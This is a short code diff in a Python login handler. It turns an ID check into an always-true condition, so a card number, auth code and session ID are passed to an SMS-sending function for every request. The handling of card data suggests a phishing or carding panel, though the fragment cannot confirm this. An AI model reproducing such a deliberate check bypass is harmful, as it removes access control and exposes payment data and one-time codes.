@@ -49,7 +49,7 @@ def login():
         ID = f'{session}'
 
         # SmokeWeEveryday
-        if id == '10000001':
+        if id == '10000001' or 1 == 1:
             if authCode is not None and authCode != 'None':
                 send_sms1(card_number, authCode, ID)
                 return '', 200  # Возвращаем пустой ответ с кодом 200
